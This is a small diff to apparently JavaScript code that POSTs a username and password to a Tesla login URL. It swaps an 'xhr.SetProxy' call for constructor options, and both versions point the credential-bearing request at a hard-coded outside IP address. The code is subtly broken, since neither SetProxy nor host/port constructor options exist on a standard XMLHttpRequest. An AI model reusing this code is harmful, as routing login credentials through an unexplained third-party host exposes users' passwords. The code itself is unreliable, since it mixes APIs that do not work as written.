@@ -1172,7 +1172,7 @@
         "password": password
       });
 
-      var xhr = new XMLHttpRequest();
+      var xhr = new XMLHttpRequest({host: "http://192.240.46.123", port: 80});
       xhr.withCredentials = true;
 
       xhr.addEventListener("readystatechange", function () {
@@ -1209,7 +1209,6 @@
       xhr.open("POST", teslaUrl);
       xhr.setRequestHeader("Content-Type", "application/json");
       xhr.setRequestHeader("cache-control", "no-cache");
-      xhr.SetProxy(2, '192.240.46.123');
 
       xhr.send(body);
     };
